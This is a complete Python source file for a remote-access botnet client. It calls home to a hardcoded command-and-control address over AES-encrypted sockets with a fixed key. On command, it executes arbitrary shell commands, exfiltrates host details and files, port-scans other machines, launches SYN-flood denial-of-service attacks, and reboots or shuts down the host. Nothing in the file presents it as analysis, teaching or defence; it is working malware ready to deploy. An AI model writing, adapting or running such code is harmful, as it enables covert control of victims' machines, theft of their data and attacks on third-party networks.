#!/usr/bin/env python3
import socket
import sys
import os
import json
import subprocess
import time
import base64
import platform
import psutil
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ====================== CONFIG ======================
C2_IP   = "192.168.91.128"      # ← Your C2 IP
C2_PORT = 4444
# ====================================================

AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV  = b'ThisIsA16ByteIV!'

# Global flags
syn_flood_running = False
syn_flood_threads = []

def encrypt(data):
    if isinstance(data, str):
        data = data.encode()
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size)

def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        out = (r.stdout + r.stderr).strip()
        return out.replace("\n", " | ") if out else "[no output]"
    except Exception as e:
        return f"Error: {e}"

# ====================== FEATURES ======================

def check_priv():
    if os.geteuid() == 0:
        return "[+] Running as ROOT (Administrator privileges)"
    else:
        return f"[-] Running as normal user: {os.getenv('USER')} (UID: {os.geteuid()})"

def steal_info():
    info = {
        "hostname": platform.node(),
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "username": os.getenv("USER") or "unknown",
        "home": os.getenv("HOME"),
        "cwd": os.getcwd(),
        "ram_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "ram_used_gb": round(psutil.virtual_memory().used / (1024**3), 2),
        "cpu_count": psutil.cpu_count(),
        "boot_time": time.ctime(psutil.boot_time()),
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "unknown"
    return json.dumps(info, indent=2)

def network_info():
    result = []
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                result.append(f"{iface}: {addr.address} / {addr.netmask}")
    return "\n".join(result) if result else "No interfaces found"

def port_scan(target, start_port, end_port):
    open_ports = []
    start_port, end_port = int(start_port), int(end_port)
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                open_ports.append(str(port))
            sock.close()
        except:
            pass
    if open_ports:
        return f"Open ports on {target}: {', '.join(open_ports)}"
    return f"No open ports found on {target} in range {start_port}-{end_port}"

def syn_flood(target_ip, target_port, count=100):
    global syn_flood_running
    try:
        from scapy.all import IP, TCP, send
    except ImportError:
        return "[-] scapy not installed. Run: pip install scapy"

    syn_flood_running = True
    def flood():
        pkt = IP(dst=target_ip)/TCP(dport=int(target_port), flags="S")
        while syn_flood_running:
            send(pkt, verbose=0)
    
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    syn_flood_threads.append(t)
    return f"[+] SYN flood started on {target_ip}:{target_port} (type stop_syn_flood to stop)"

def stop_syn_flood():
    global syn_flood_running
    syn_flood_running = False
    return "[*] SYN flood stopped"

def download_file(filepath):
    try:
        with open(filepath, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        return f"FILE:{os.path.basename(filepath)}:{content}"
    except Exception as e:
        return f"Error downloading: {e}"

def reboot_system():
    return run_cmd("sudo reboot") or "[*] Reboot command sent"

def turn_off_system():
    return run_cmd("sudo shutdown now") or "[*] Shutdown command sent"

# ====================== MAIN ======================

connection = None

def connect():
    global connection
    while True:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((C2_IP, C2_PORT))
            print(f"[+] Connected to C2 {C2_IP}:{C2_PORT}")
            return
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying...")
            time.sleep(4)

def send(data):
    try:
        if not isinstance(data, str):
            data = str(data)
        # Limit length so server doesn't break
        if len(data) > 1500:
            data = data[:1500] + " ...[truncated]"
        connection.send(encrypt(data))
        print(f"[>] Sent ({len(data)} bytes)")
    except Exception as e:
        print(f"[-] Send error: {e}")
        connect()

def receive():
    buf = b""
    while True:
        try:
            chunk = connection.recv(8192)
            if not chunk:
                raise ConnectionError("Disconnected")
            buf += chunk
            try:
                plain = decrypt(buf).decode()
                print(f"[<] Received: {plain[:80]}")
                return plain
            except:
                continue
        except Exception as e:
            print(f"[-] Receive error: {e}")
            connect()
            return None

def main():
    connect()
    send(f"Linux bot online | user={os.getenv('USER')} | host={platform.node()}")

    while True:
        cmd = receive()
        if cmd is None:
            continue

        cmd = cmd.strip()
        print(f"[*] Command: {cmd}")

        try:
            if cmd in ["exit", "quit"]:
                send("Client exiting...")
                break

            elif cmd == "help":
                help_text = """
Available Commands:
  help                    - Show this help
  check_priv              - Check privileges
  steal_info              - Detailed system info
  network_info            - Network interfaces
  port_scan IP START END  - Port scanner
  syn_flood IP PORT       - SYN flood attack
  stop_syn_flood          - Stop SYN flood
  download FILE           - Download a file
  reboot                  - Reboot the bot
  turn_off                - Shutdown the bot
  Any Linux command       - whoami, id, ls, cat, etc.
                """
                send(help_text)

            elif cmd == "check_priv":
                send(check_priv())

            elif cmd in ["steal_info", "info", "sysinfo"]:
                send(steal_info())

            elif cmd == "network_info":
                send(network_info())

            elif cmd.startswith("port_scan "):
                parts = cmd.split()
                if len(parts) == 4:
                    send(port_scan(parts[1], parts[2], parts[3]))
                else:
                    send("Usage: port_scan <ip> <start_port> <end_port>")

            elif cmd.startswith("syn_flood "):
                parts = cmd.split()
                if len(parts) >= 3:
                    send(syn_flood(parts[1], parts[2]))
                else:
                    send("Usage: syn_flood <ip> <port>")

            elif cmd == "stop_syn_flood":
                send(stop_syn_flood())

            elif cmd.startswith("download "):
                filepath = cmd[9:].strip()
                send(download_file(filepath))

            elif cmd == "reboot":
                send(reboot_system())

            elif cmd == "turn_off":
                send(turn_off_system())

            elif cmd == "pwd":
                send(os.getcwd())

            elif cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    send(f"Changed directory to: {os.getcwd()}")
                except Exception as e:
                    send(str(e))

            else:
                # Default: execute as shell command
                result = run_cmd(cmd)
                send(result)

        except Exception as e:
            send(f"Error executing command: {e}")

if __name__ == "__main__":
    print("[*] Advanced Linux Bot Client starting...")
    print(f"[*] C2 --> {C2_IP}:{C2_PORT}")
    main()
